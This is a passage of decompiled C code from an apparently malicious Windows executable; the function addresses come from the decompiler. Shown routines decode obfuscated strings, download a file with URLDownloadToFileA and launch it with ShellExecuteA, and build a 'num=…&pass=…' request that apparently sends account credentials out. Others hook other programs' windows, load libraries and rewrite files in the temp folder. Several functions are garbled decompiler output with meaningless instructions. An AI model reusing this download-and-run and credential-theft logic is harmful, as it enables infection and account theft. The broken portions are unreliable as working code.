    int32_t timerId = SetTimer((int32_t *)0x406116, 1000 * *(int32_t *)v6, 0, NULL); // 0x40617d
    g28 = timerId;
    return timerId;
}

// Address range: 0x40618a - 0x4061a8
int32_t function_40618a(void) {
    // 0x40618a
    int32_t result; // 0x40618a
    if (g28 != 0) {
        // 0x406193
        KillTimer((int32_t *)g28, 0);
        g28 = 0;
        result = 0;
    }
    // 0x4061a7
    return result;
}

// Address range: 0x4061aa - 0x4061b6
int32_t function_4061aa(void) {
    // 0x4061aa
    int32_t v1; // 0x4061aa
    return function_4060ce(v1);
}

// Address range: 0x4061b6 - 0x4061dd
int32_t function_4061b6(void) {
    // 0x4061b6
    if (g29 != 0) {
        // 0x4061bf
        function_4061de();
    }
    int32_t timerId = SetTimer((int32_t *)0x4061aa, 0x1492, 0, NULL); // 0x4061d2
    g29 = timerId;
    return timerId;
}

// Address range: 0x4061de - 0x4061fc
int32_t function_4061de(void) {
    // 0x4061de
    int32_t result; // 0x4061de
    if (g29 != 0) {
        // 0x4061e7
        KillTimer((int32_t *)g29, 0);
        g29 = 0;
        result = 0;
    }
    // 0x4061fb
    return result;
}

// Address range: 0x4061fe - 0x406223
int32_t function_4061fe(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x406209
    __writefsdword(0, (int32_t)&v1);
    g106++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x406223 - 0x406228
int32_t function_406223(void) {
    // 0x406223
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x406228 - 0x40622a
int32_t function_406228(void) {
    // 0x406228
    int32_t result; // 0x406228
    return result;
}

// Address range: 0x40622a - 0x40622c
int32_t function_40622a(int32_t a1) {
    // 0x40622a
    int32_t result; // 0x40622a
    return result;
}

// Address range: 0x40622e - 0x406236
int32_t function_40622e(void) {
    // 0x40622e
    g106--;
    int32_t result; // 0x40622e
    return result;
}

// Address range: 0x406236 - 0x40623c
int32_t function_406236(void) {
    // 0x406236
    return URLDownloadToFileA2();
}

// Address range: 0x40623e - 0x4062ca
int32_t function_40623e(void) {
    // 0x40623e
    function_403806();
    int32_t v1 = __readfsdword(0); // bp-32, 0x40625a
    __writefsdword(0, (int32_t)&v1);
    function_403616();
    function_4039a2();
    int32_t v2 = function_403616(); // 0x406274
    int32_t v3 = 1; // 0x40627d
    int32_t v4 = v2; // 0x40627d
    if (v2 < 1) {
        // 0x4062b4
        __writefsdword(0, v1);
        return function_4034be();
    }
    int32_t v5 = v3 - 1;
    int32_t v6; // 0x40623e
    char * v7 = (char *)(v5 + v6); // 0x406287
    int32_t v8 = function_40386e();
    if (*v7 != 61) {
        // 0x40629c
        *(char *)(v8 + v5) = *v7 - 1;
    } else {
        // 0x40628e
        *(char *)(v8 + v5) = 46;
    }
    // 0x4062b0
    v4--;
    v3++;
    while (v4 != 0) {
        // 0x406284
        v5 = v3 - 1;
        v7 = (char *)(v5 + v6);
        v8 = function_40386e();
        if (*v7 != 61) {
            // 0x40629c
            *(char *)(v8 + v5) = *v7 - 1;
        } else {
            // 0x40628e
            *(char *)(v8 + v5) = 46;
        }
        // 0x4062b0
        v4--;
        v3++;
    }
    // 0x4062b4
    __writefsdword(0, v1);
    return function_4034be();
}

// Address range: 0x4062ca - 0x4062cf
int32_t function_4062ca(void) {
    // 0x4062ca
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x4062cf - 0x4062d1
int32_t function_4062cf(void) {
    // 0x4062cf
    int32_t result; // 0x4062cf
    return result;
}

// Address range: 0x4062d1 - 0x4062d7
int32_t function_4062d1(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x4062d1
    int32_t result; // 0x4062d1
    return result;
}

// Address range: 0x4062da - 0x406310
int32_t function_4062da(void) {
    // 0x4062da
    int32_t v1; // 0x4062da
    int32_t v2; // 0x4062da
    function_4028ee(v2, v1);
    function_4027e2();
    return function_4035f2();
}

// Address range: 0x406312 - 0x406459
int32_t function_406312(void) {
    // 0x406312
    int32_t v1; // bp-4, 0x406312
    int32_t v2 = &v1; // 0x406312
    int32_t v3 = v2; // 0x406315
    int32_t v4; // 0x406312
    for (int32_t i = 5; i > 0; i--) {
        // 0x40631a
        v4 = v3;
        *(int32_t *)(v4 - 4) = 0;
        v3 = v4 - 8;
        *(int32_t *)v3 = 0;
    }
    // 0x406321
    *(int32_t *)(v4 - 12) = 0;
    *(int32_t *)(v4 - 20) = v2;
    *(int32_t *)(v4 - 24) = 0x406459;
    int32_t v5 = __readfsdword(0); // 0x40632b
    int32_t v6 = v4 - 28; // 0x40632b
    *(int32_t *)v6 = v5;
    __writefsdword(0, v6);
    function_4035c2();
    function_40623e();
    function_403816();
    function_4035c2();
    int32_t v7; // bp-12, 0x406312
    *(int32_t *)(v4 - 32) = (int32_t)&v7;
    function_403876(&g117);
    function_4038b6();
    int32_t v8; // bp-16, 0x406312
    *(int32_t *)(v4 - 36) = (int32_t)&v8;
    function_403616();
    function_403876(&g117);
    *(int32_t *)(v4 - 40) = (int32_t)"Down(";
    function_4062da();
    *(int32_t *)(v4 - 48) = (int32_t)&g4;
    *(int32_t *)(v4 - 52) = v8;
    function_4036d6((int32_t)&g117);
    *(int32_t *)(v4 - 56) = 0;
    *(int32_t *)(v4 - 60) = 0;
    function_403662();
    *(int32_t *)(v4 - 64) = function_403816();
    function_4035c2();
    function_40623e();
    *(int32_t *)(v4 - 68) = function_403816();
    *(int32_t *)(v4 - 72) = 0;
    function_406236();
    *(int32_t *)(v4 - 76) = 1;
    *(int32_t *)(v4 - 80) = 0;
    *(int32_t *)(v4 - 84) = 0;
    function_403662();
    int32_t v9 = function_403816(); // 0x40642c
    int32_t * v10 = (int32_t *)(v4 - 88); // 0x406431
    *v10 = v9;
    *(int32_t *)(v4 - 92) = (int32_t)"Open";
    int32_t * v11 = (int32_t *)(v4 - 96); // 0x406437
    *v11 = 0;
    ShellExecuteA(&g117, (char *)&g117, (char *)&g117, (char *)&g117, (char *)&g117, (int32_t)&g117);
    __writefsdword(0, *v11);
    *v10 = 0x406460;
    return function_4034e2();
}

// Address range: 0x406459 - 0x40645e
int32_t function_406459(void) {
    // 0x406459
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x40645e - 0x406460
int32_t function_40645e(void) {
    // 0x40645e
    int32_t result; // 0x40645e
    return result;
}

// Address range: 0x406460 - 0x406465
int32_t function_406460(int32_t a1) {
    // 0x406460
    int32_t result; // 0x406460
    return result;
}

// Address range: 0x406485 - 0x4066e4
int32_t function_406485(int32_t a1, int32_t a2) {
    int32_t v1 = a2;
    int32_t v2; // 0x406485
    *(int32_t *)v2 = v2 + 1;
    int32_t v3; // 0x406485
    int32_t v4 = v3;
    *(char *)v4 = *(char *)&v3 + (char)v4;
    char * v5 = (char *)(v2 + 58); // 0x406489
    *v5 = *v5 + (char)(v3 / 256);
    int32_t v6; // 0x406485
    char * v7 = (char *)(v6 + 112); // 0x40648d
    int32_t v8; // 0x406485
    *v7 = *v7 + (char)v8;
    int32_t v9; // 0x406485
    int32_t v10; // 0x406485
    __asm_outsb((int16_t)v10, __readgsbyte(v9));
    int32_t v11 = v3;
    *(char *)v11 = *(char *)&v3 + (char)v11;
    int32_t v12 = v3;
    *(char *)v12 = *(char *)&v3 + (char)v12;
    int32_t v13 = &v1; // 0x406496
    int32_t v14 = v13; // 0x406499
    int32_t v15; // 0x406485
    for (int32_t i = 11; i > 0; i--) {
        // 0x40649e
        v15 = v14;
        *(int32_t *)(v15 - 4) = 0;
        v14 = v15 - 8;
        *(int32_t *)v14 = 0;
    }
    // 0x4064a5
    *(int32_t *)(v15 - 12) = 0;
    *(int32_t *)(v15 - 20) = v13;
    *(int32_t *)(v15 - 24) = 0x4066e4;
    int32_t v16 = __readfsdword(0); // 0x4064af
    int32_t v17 = v15 - 28; // 0x4064af
    *(int32_t *)v17 = v16;
    __writefsdword(0, v17);
    function_40395a();
    int32_t v18; // bp-4, 0x406485
    *(int32_t *)(v15 - 32) = (int32_t)&v18;
    function_403876(&g117);
    int32_t v19 = v15 - 36; // 0x4064e0
    int32_t * v20 = (int32_t *)v19;
    int32_t v21; // bp-8, 0x406485
    *v20 = (int32_t)&v21;
    function_403616();
    function_403876(&g117);
    v3 = a1 - 1;
    int32_t * v22 = v20; // 0x406485
    int32_t v23 = v19; // 0x406485
    switch (a1) {
        case 0: {
            // 0x406517
            v22 = v20;
            v23 = v19;
            if (function_403616() >= 5) {
                // 0x406528
                function_4035c2();
                function_40623e();
                function_4035c2();
                function_40623e();
                *(int32_t *)(v15 - 48) = v18;
                *(int32_t *)(v15 - 52) = (int32_t)&g5;
                *(int32_t *)(v15 - 56) = v21;
                function_4036d6((int32_t)&g117);
                *(int32_t *)(v15 - 64) = 0x406712;
                *(int32_t *)(v15 - 68) = v18;
                *(int32_t *)(v15 - 72) = 0x406722;
                *(int32_t *)(v15 - 76) = v21;
                *(int32_t *)(v15 - 80) = 0x406732;
                function_40755e();
                function_4036d6((int32_t)&g117);
                int32_t v24 = v15 - 92; // 0x4065b6
                int32_t * v25 = (int32_t *)v24;
                int32_t v26; // bp-40, 0x406485
                *v25 = (int32_t)&v26;
                function_4035c2();
                function_40623e();
                int32_t v27 = function_40395a(); // 0x4065da
                int32_t * v28 = (int32_t *)(v15 - 96); // 0x4065e0
                *v28 = v27 - 1;
                function_4035c2();
                function_40623e();
                function_403876(&g117);
                *v28 = v26;
                function_4035c2();
                function_40623e();
                function_4035c2();
                function_40623e();
                function_40591e((int32_t)&g117, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117);
                v22 = v25;
                v23 = v24;
            }
            // break -> 0x4066c9
            break;
        }
        case 1: {
            // 0x406654
            v22 = v20;
            v23 = v19;
            if (function_403616() >= 5) {
                // 0x406661
                *(int32_t *)(v15 - 40) = (int32_t)"num=";
                function_404c6e();
                *(int32_t *)(v15 - 48) = (int32_t)"&pass=";
                function_404c6e();
                int32_t v29 = v15 - 52; // 0x406684
                function_4036d6((int32_t)&g117);
                function_4035c2();
                function_40623e();
                function_404dc6();
                v22 = (int32_t *)v29;
                v23 = v29;
            }
            // break -> 0x4066c9
            break;
        }
        case 2: {
            // 0x4066be
            function_403616();
            v22 = v20;
            v23 = v19;
            // break -> 0x4066c9
            break;
        }
    }
    // 0x4066c9
    __writefsdword(0, *v22);
    *(int32_t *)(v23 + 8) = 0x4066eb;
    return function_4034e2();
}

// Address range: 0x4066e4 - 0x4066e9
int32_t function_4066e4(void) {
    // 0x4066e4
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x4066e9 - 0x4066eb
int32_t function_4066e9(void) {
    // 0x4066e9
    int32_t result; // 0x4066e9
    return result;
}

// Address range: 0x4066eb - 0x4066f2
int32_t function_4066eb(int32_t a1) {
    // 0x4066eb
    int32_t result; // 0x4066eb
    return result;
}

// Address range: 0x406715 - 0x406718
int32_t function_406715(void) {
    // 0x406715
    int32_t result; // 0x406715
    return result;
}

// Address range: 0x40671d - 0x406724
int32_t function_40671d(void) {
    // 0x40671d
    int32_t v1; // 0x40671d
    *(int32_t *)v1 = v1 + 1;
    int32_t result; // 0x40671d
    int32_t v2 = result;
    *(char *)v2 = *(char *)&result + (char)v2;
    uint32_t v3 = result;
    *(char *)v3 = *(char *)&result + (char)(v3 / 256);
    return result;
}

// Address range: 0x406724 - 0x406728
int32_t function_406724(void) {
    // 0x406724
    return (float32_t)function_406762((int32_t)&g117);
}

// Address range: 0x406760 - 0x406762
int32_t function_406760(void) {
    // 0x406760
    int32_t result; // 0x406760
    *(char *)result = 2 * (char)result;
    return result;
}

// Address range: 0x406762 - 0x4067e3
float80_t function_406762(int32_t a1) {
    // 0x406762
    int32_t v1; // 0x406762
    int32_t v2; // 0x406762
    int32_t v3; // 0x406762
    int32_t v4; // 0x406762
    int32_t v5; // 0x406762
    bool v6; // 0x406762
    if (v6) {
        goto lab_0x4067c6;
    } else {
        bool v7; // 0x406762
        if (!v7) {
            // 0x4067da
            return 1.0;
        }
        // 0x406767
        int32_t v8; // 0x406762
        __asm_in((int16_t)v8);
        int32_t v9 = *(int32_t *)(v5 + 12); // 0x40676f
        int32_t v10; // bp-8, 0x406762
        v4 = &v10;
        v2 = v9;
        if (v9 != 74) {
            goto lab_0x4067cb;
        } else {
            // 0x406777
            function_4039a2();
            function_40386e();
            function_4046fa();
            CreateThread((struct _SECURITY_ATTRIBUTES *)(v5 + 20), 0, (int32_t (*)(int32_t *))1, (int32_t *)0x406496, 0, NULL);
            int32_t v11 = 0; // bp-56, 0x4067c4
            v3 = &v11;
            v1 = v9;
            goto lab_0x4067c6;
        }
    }
  lab_0x4067c6:
    // 0x4067c6
    CreateThread((struct _SECURITY_ATTRIBUTES *)&g117, (int32_t)&g117, (int32_t (*)(int32_t *))&g117, &g117, (int32_t)&g117, &g117);
    v4 = v3;
    v2 = v1;
    goto lab_0x4067cb;
  lab_0x4067cb:
    // 0x4067cb
    *(int32_t *)(v4 - 4) = *(int32_t *)(v5 + 20);
    *(int32_t *)(v4 - 8) = *(int32_t *)(v5 + 16);
    *(int32_t *)(v4 - 12) = v2;
    *(int32_t *)(v4 - 16) = *(int32_t *)(v5 + 8);
    float80_t result; // 0x406762
    return result;
}

// Address range: 0x4067e6 - 0x40681b
int32_t function_4067e6(void) {
    // 0x4067e6
    return SetWindowLongA((int32_t *)0x40676a, -4, function_40470a(0, 0, 0, 0, 0, 0, 0, (int32_t)g81, 0));
}

// Address range: 0x40681b - 0x40693b
int32_t function_40681b(int32_t a1, uint32_t a2, int32_t a3, int32_t a4, int32_t lpClassName, int32_t a6, int32_t a7) {
    // 0x40681b
    int32_t v1; // 0x40681b
    unsigned char v2 = (char)v1;
    *(char *)v1 = 2 * v2;
    char * v3 = (char *)(v1 + 114); // 0x40681d
    uint32_t v4; // 0x40681b
    char v5 = v4 / 256; // 0x40681d
    *v3 = *v3 + v5;
    unsigned char v6 = v2 - 32; // 0x406820
    int32_t result = v1 & -256 | (int32_t)v6; // 0x406820
    if (v2 >= 32 && v6 != 0) {
        // 0x406893
        return result;
    }
    char * v7 = (char *)(result + 105); // 0x406824
    *v7 = *v7 & v5;
    int16_t v8 = a3; // 0x406828
    __asm_outsb(v8, *(char *)a6);
    char * v9 = (char *)(lpClassName + 105 & 0xffff); // 0x406829
    char v10 = a2 / 256; // 0x406829
    *v9 = *v9 & v10;
    char * v11 = (char *)(a2 + 115 + 2 * lpClassName); // 0x40682d
    char v12 = *v11 + (char)a2; // 0x40682d
    *v11 = v12;
    if (v12 != 0) {
        // 0x406833
        __asm_outsd(v8, *(int32_t *)a6);
        int32_t * v13 = FindWindowA((char *)lpClassName, (char *)&g117); // 0x40684a
        if (v13 != NULL) {
            // 0x406893
            return (int32_t)v13;
        }
        // 0x406857
        function_4067e6();
        return (int32_t)LoadLibraryA((char *)function_403816());
    }
    int32_t * v14 = (int32_t *)(a4 + 0x5e853d8); // 0x40687c
    *v14 = *v14 - 1;
    int32_t * v15 = (int32_t *)(lpClassName + 0x6a0c74c0); // 0x406884
    *v15 = *v15 + 1;
    char * v16 = (char *)a3; // 0x40688a
    *v16 = *v16 + v10;
    return -0x226218 * *(int32_t *)a1;
}

// Address range: 0x40693b - 0x406bb0
int32_t function_40693b(int32_t a1, uint32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = a1;
    int32_t v2 = a4;
    int32_t v3; // 0x40693b
    unsigned char v4 = (char)v3;
    *(char *)v3 = 2 * v4;
    char * v5 = (char *)(v3 + 114); // 0x40693d
    uint32_t v6; // 0x40693b
    char v7 = v6 / 256; // 0x40693d
    *v5 = *v5 + v7;
    unsigned char v8 = v4 - 32; // 0x406940
    if (v4 < 32 || v8 == 0) {
        char * v9 = (char *)((v3 & -256 | (int32_t)v8) + 105); // 0x406944
        *v9 = *v9 & v7;
        int32_t result = v1; // 0x406947
        int16_t v10 = a3; // 0x406948
        __asm_outsb(v10, *(char *)a6);
        char * v11 = (char *)(a5 + 105 & 0xffff); // 0x406949
        char v12 = a2 / 256; // 0x406949
        *v11 = *v11 & v12;
        char * v13 = (char *)(a2 + 115 + 2 * a5); // 0x40694d
        char v14 = *v13 + (char)a2; // 0x40694d
        *v13 = v14;
        if (v14 == 0) {
            // 0x406995
            int32_t v15; // bp+32, 0x40693b
            *(int32_t *)((int32_t)&v15 - 4) = 0x4069a2;
            return result;
        }
        // 0x406953
        __asm_outsd(v10, *(int32_t *)a6);
        if (v14 < 0) {
            // 0x4069ca
            return result;
        }
        unsigned char v16 = (char)result; // 0x406958
        unsigned char v17 = v16 - 32; // 0x406958
        int32_t result2 = result & -256 | (int32_t)v17; // 0x406958
        if (v16 >= 32 && v17 != 0) {
            char * v18 = (char *)result2; // 0x4069cb
            unsigned char v19 = *v18; // 0x4069cb
            unsigned char v20 = v19 + v17; // 0x4069cb
            *v18 = v20;
            int32_t * v21 = (int32_t *)result2; // 0x4069ce
            *v21 = *v21 + result2 + (int32_t)(v20 < v19);
            *v18 = *v18 + v17;
            return result2;
        }
        char * v22 = (char *)(a2 + 105); // 0x40695c
        *v22 = *v22 & (char)(result / 256);
        char * v23 = (char *)(a6 + 105); // 0x40695f
        *v23 = *v23 & v12;
        char * v24 = (char *)result2; // 0x406962
        *v24 = *v24 + 2 * v17;
        int32_t * v25 = (int32_t *)a2; // 0x406966
        *v25 = *v25 + a6;
        *v24 = *v24 + v17;
        v1 = a5;
        v2 = __readfsdword(0);
        __writefsdword(0, (int32_t)&v2);
        int32_t v26 = g107 + 1; // 0x40697b
        g107 = v26;
        if (v26 == 0) {
            // 0x406983
            function_4034be();
        }
        // 0x40698d
        __writefsdword(0, v2);
        // 0x406995
        *(int32_t *)((int32_t)&v1 - 4) = 0x4069a2;
        return 0;
    }
    // 0x4069b3
    int32_t v27; // 0x40693b
    int32_t v28; // 0x40693b
    int32_t * v29 = (int32_t *)(v27 + 105 + 2 * v28); // 0x4069b3
    int32_t v30; // 0x40693b
    *v29 = *v29 | v30;
    function_403662();
    char * lpFileName = (char *)function_403816(); // 0x406a4f
    char * v31 = lpFileName; // bp-8, 0x406a4f
    int32_t * fileHandle = CreateFileA(lpFileName, (int32_t)&g117, (int32_t)&g117, (struct _SECURITY_ATTRIBUTES *)&g117, (int32_t)&g117, (int32_t)&g117, &g117); // 0x406a50
    int32_t v32 = (int32_t)&v31; // 0x406a5a
    if (fileHandle != (int32_t *)-1) {
        int32_t v33 = (int32_t)fileHandle; // 0x406a50
        int32_t v34 = v33; // bp-16, 0x406a62
        int32_t v35 = GetFileSize(NULL, fileHandle); // 0x406a63
        int32_t * v36 = (int32_t *)v6; // 0x406a68
        *v36 = v35;
        v32 = &v34;
        if (v6 >= 1) {
            // 0x406a7c
            function_4039a2();
            int32_t hFile = function_40386e(); // 0x406a8f
            ReadFile((int32_t *)hFile, fileHandle, (int32_t)&g117, &g117, (struct _OVERLAPPED *)&g117);
            int32_t v37 = v33; // bp-40, 0x406a9b
            int32_t v38 = &v37; // 0x406a9b
            CloseHandle(fileHandle);
            function_404822();
            int32_t v39; // 0x40693b
            int32_t * v40 = (int32_t *)(v39 - 12); // 0x406b84
            int32_t v41 = v38; // 0x406b88
            if (*v40 != 0) {
                int32_t v42 = v39 - 20;
                int32_t v43 = v39 - 24;
                *v36 = function_40395a();
                *(int32_t *)(v38 - 4) = v39 - 16;
                function_403876(&g117);
                function_4038b6();
                *v36 = function_40395a();
                *(int32_t *)(v38 - 8) = v42;
                function_403876(&g117);
                int32_t v44 = v38 - 12; // 0x406b19
                *(int32_t *)v44 = v43;
                function_403616();
                function_403876(&g117);
                if (*(int32_t *)v42 != 0) {
                    // 0x406b37
                    if (*(int32_t *)v43 != 0) {
                        // 0x406b3d
                        *(int32_t *)(v38 - 16) = function_403dd6() + 1;
                        function_403f92();
                        function_403dde();
                        function_403512();
                        function_403dde();
                        function_403512();
                    }
                }
                // 0x406b84
                v41 = v44;
                while (*v40 != 0) {
                    int32_t v45 = v44;
                    *v36 = function_40395a();
                    *(int32_t *)(v45 - 4) = v39 - 16;
                    function_403876(&g117);
                    function_4038b6();
                    *v36 = function_40395a();
                    *(int32_t *)(v45 - 8) = v42;
                    function_403876(&g117);
                    v44 = v45 - 12;
                    *(int32_t *)v44 = v43;
                    function_403616();
                    function_403876(&g117);
                    if (*(int32_t *)v42 != 0) {
                        // 0x406b37
                        if (*(int32_t *)v43 != 0) {
                            // 0x406b3d
                            *(int32_t *)(v45 - 16) = function_403dd6() + 1;
                            function_403f92();
                            function_403dde();
                            function_403512();
                            function_403dde();
                            function_403512();
                        }
                    }
                    // 0x406b84
                    v41 = v44;
                }
            }
            // 0x406b8e
            *(int32_t *)(v39 - 4) = -1;
            v32 = v41;
        }
    }
    // 0x406b95
    __writefsdword(0, *(int32_t *)v32);
    *(int32_t *)(v32 + 8) = 0x406bb7;
    return function_4034e2();
}

// Address range: 0x406bb0 - 0x406bb5
int32_t function_406bb0(void) {
    // 0x406bb0
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x406bb5 - 0x406bb7
int32_t function_406bb5(void) {
    // 0x406bb5
    int32_t result; // 0x406bb5
    return result;
}

// Address range: 0x406bb7 - 0x406bc1
int32_t function_406bb7(int32_t a1, int32_t a2, int32_t a3) {
    // 0x406bb7
    int32_t v1; // 0x406bb7
    return *(int32_t *)(v1 - 4);
}

// Address range: 0x406bee - 0x406cf2
int32_t function_406bee(void) {
    int32_t v1 = 0; // bp-8, 0x406bf1
    int32_t v2 = __readfsdword(0); // bp-40, 0x406c02
    int32_t v3 = &v2; // 0x406c02
    __writefsdword(0, v3);
    int32_t v4 = v3; // 0x406c16
    if (function_403dd6() >= 1) {
        // 0x406c1c
        function_403662();
        char * lpFileName = (char *)function_403816(); // 0x406c4b
        char * v5 = lpFileName; // bp-68, 0x406c4b
        int32_t v6 = (int32_t)&v5; // 0x406c4b
        int32_t * fileHandle = CreateFileA(lpFileName, (int32_t)&g117, (int32_t)&g117, (struct _SECURITY_ATTRIBUTES *)&g117, (int32_t)&g117, (int32_t)&g117, &g117); // 0x406c4c
        v4 = v6;
        if (fileHandle != (int32_t *)-1) {
            // 0x406c58
            function_4034be();
            uint32_t v7 = function_403dde(); // 0x406c65
            int32_t v8 = v6; // 0x406c6e
            if (v7 >= 0) {
                int32_t v9 = 0; // 0x406c71
                int32_t v10 = v6; // 0x406c71
                int32_t v11 = v7 + 1; // 0x406c71
                *(int32_t *)(v10 - 4) = 0;
                int32_t v12 = 8 * v9; // 0x406c7b
                *(int32_t *)(v10 - 8) = *(int32_t *)(g109 + v12);
                *(int32_t *)(v10 - 12) = (int32_t)&g6;
                *(int32_t *)(v10 - 16) = *(int32_t *)(g109 + (v12 | 4));
                v10 -= 20;
                *(int32_t *)v10 = (int32_t)"\r\n";
                function_4036d6((int32_t)&g117);
                v11--;
                v9++;
                v8 = v10;
                while (v11 != 0) {
                    // 0x406c73
                    *(int32_t *)(v10 - 4) = 0;
                    v12 = 8 * v9;
                    *(int32_t *)(v10 - 8) = *(int32_t *)(g109 + v12);
                    *(int32_t *)(v10 - 12) = (int32_t)&g6;
                    *(int32_t *)(v10 - 16) = *(int32_t *)(g109 + (v12 | 4));
                    v10 -= 20;
                    *(int32_t *)v10 = (int32_t)"\r\n";
                    function_4036d6((int32_t)&g117);
                    v11--;
                    v9++;
                    v8 = v10;
                }
            }
            int32_t v13 = (int32_t)fileHandle; // 0x406c4c
            function_404822();
            *(int32_t *)(v8 - 4) = 0;
            *(int32_t *)(v8 - 8) = (int32_t)&v1;
            *(int32_t *)(v8 - 12) = function_403616();
            *(int32_t *)(v8 - 16) = function_40386e();
            *(int32_t *)(v8 - 20) = v13;
            function_4045ba();
            *(int32_t *)(v8 - 24) = v13;
            SetEndOfFile(&g117);
            int32_t v14 = v8 - 28; // 0x406cce
            *(int32_t *)v14 = v13;
            CloseHandle(&g117);
            v4 = v14;
        }
    }
    // 0x406cd7
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x406cf9;
    return function_4034e2();
}

// Address range: 0x406cf2 - 0x406cf7
int32_t function_406cf2(void) {
    // 0x406cf2
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x406cf7 - 0x406cf9
int32_t function_406cf7(void) {
    // 0x406cf7
    int32_t result; // 0x406cf7
    return result;
}

// Address range: 0x406cf9 - 0x406d02
int32_t function_406cf9(int32_t a1, int32_t a2, int32_t a3) {
    // 0x406cf9
    int32_t result; // 0x406cf9
    return result;
}

// Address range: 0x406d2e - 0x406e1d
int32_t function_406d2e(void) {
    // 0x406d2e
    function_403806();
    function_403806();
    int32_t v1 = __readfsdword(0); // bp-40, 0x406d5a
    __writefsdword(0, (int32_t)&v1);
    if (function_403dde() < 0) {
        // 0x406db6
        function_403dd6();
        function_403f92();
        function_403dde();
        function_403512();
        function_403dde();
        function_403512();
        function_406bee();
    } else {
        // 0x406d84
        function_403762();
        function_403762();
    }
    // 0x406e02
    __writefsdword(0, v1);
    return function_4034e2();
}

// Address range: 0x406e1d - 0x406e22
int32_t function_406e1d(void) {
    // 0x406e1d
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x406e22 - 0x406e24
int32_t function_406e22(void) {
    // 0x406e22
    int32_t result; // 0x406e22
    return result;
}

// Address range: 0x406e24 - 0x406e2e
int32_t function_406e24(int32_t a1, int32_t a2, int32_t a3) {
    // 0x406e24
    int32_t v1; // 0x406e24
    return *(int32_t *)(v1 - 12);
}

// Address range: 0x406e2e - 0x406e74
int32_t function_406e2e(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x406e39
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g108 + 1; // 0x406e3f
    g108 = v2;
    if (v2 != 0) {
        // 0x406e66
        __writefsdword(0, v1);
        return 0;
    }
    // 0x406e47
    if (g32 != 0) {
        // 0x406e51
        function_406bee();
    }
    // 0x406e56
    function_403f9e();
    // 0x406e66
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x406e74 - 0x406e79
int32_t function_406e74(void) {
    // 0x406e74
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x406e79 - 0x406e7b
int32_t function_406e79(void) {
    // 0x406e79
    int32_t result; // 0x406e79
    return result;
}

// Address range: 0x406e7b - 0x406e7d
int32_t function_406e7b(int32_t a1) {
    // 0x406e7b
    int32_t result; // 0x406e7b
    return result;
}

// Address range: 0x406e7e - 0x406ec0
int32_t function_406e7e(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x406e89
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g108; // 0x406e8f
    g108 = v2 - 1;
    if (v2 == 0) {
        // 0x406e98
        function_403f92();
    }
    // 0x406eb2
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x406ec0 - 0x406ec5
int32_t function_406ec0(void) {
    // 0x406ec0
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x406ec5 - 0x406ec7
int32_t function_406ec5(void) {
    // 0x406ec5
    int32_t result; // 0x406ec5
    return result;
}

// Address range: 0x406ec7 - 0x406ec9
int32_t function_406ec7(int32_t a1) {
    // 0x406ec7
    int32_t result; // 0x406ec7
    return result;
}

// Address range: 0x406eca - 0x406ed0
bool function_406eca(char * pszPath) {
    // 0x406eca
    return PathFileExistsA(pszPath);
}

// Address range: 0x406ed2 - 0x406f10
int32_t function_406ed2(void) {
    int32_t v1 = 260; // bp-276, 0x406edc
    int32_t nBufferLength; // 0x406ed2
    int32_t pathSize = GetTempPathA(nBufferLength, (char *)&g117); // 0x406ee1
    if (pathSize == 0) {
        // 0x406f08
        return 0;
    }
    int32_t v2 = &v1; // 0x406edc
    int32_t v3 = pathSize + v2;
    if (*(char *)(v3 - 1) != 92) {
        // 0x406ef1
        *(char *)v3 = 92;
        *(char *)(pathSize + (v2 | 1)) = 0;
    }
    // 0x406f08
    return function_4035fe();
}

// Address range: 0x406f12 - 0x406fe4
int32_t function_406f12(int32_t a1, int32_t nIndex) {
    int32_t hWnd2 = 0; // bp-8, 0x406f15
    int32_t v1 = __readfsdword(0); // bp-40, 0x406f2c
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = nIndex; // bp-44, 0x406f35
    int32_t * hWnd = (int32_t *)nIndex; // 0x406f36
    bool isVisible = IsWindowVisible(hWnd); // 0x406f36
    int32_t v3 = &v2; // 0x406f43
    if (isVisible) {
        int32_t v4 = nIndex; // bp-52, 0x406f4b
        int32_t v5 = GetClassLongA((int32_t *)-32, nIndex); // 0x406f4c
        v3 = &v4;
        if (v5 == 0x8002) {
            int32_t v6 = nIndex; // bp-56, 0x406f58
            int32_t * v7 = GetParent(hWnd); // 0x406f59
            v3 = &v6;
            if (*(int32_t *)(a1 + 4) == (int32_t)v7) {
                int32_t v8 = nIndex; // bp-64, 0x406f67
                int32_t v9 = &v8; // 0x406f67
                GetWindowThreadProcessId(&hWnd2, hWnd);
                v3 = v9;
                if (*(int32_t *)a1 == hWnd2) {
                    // 0x406f74
                    if (*(int32_t *)(a1 + 8) == 0) {
                        int32_t hWndParent = *(int32_t *)(a1 + 12); // 0x406f9e
                        int32_t hWndChildAfter = *(int32_t *)(a1 + 16); // 0x406fa2
                        int32_t * hWnd3 = FindWindowExA((int32_t *)hWndParent, (int32_t *)hWndChildAfter, NULL, (char *)nIndex); // 0x406fa9
                        int32_t v10 = (int32_t)hWnd3; // 0x406fa9
                        *(int32_t *)(a1 + 24) = v10;
                        int32_t v11 = v10; // bp-84, 0x406fb4
                        int32_t v12 = &v11; // 0x406fb4
                        v3 = v12;
                        if (IsWindow(hWnd3)) {
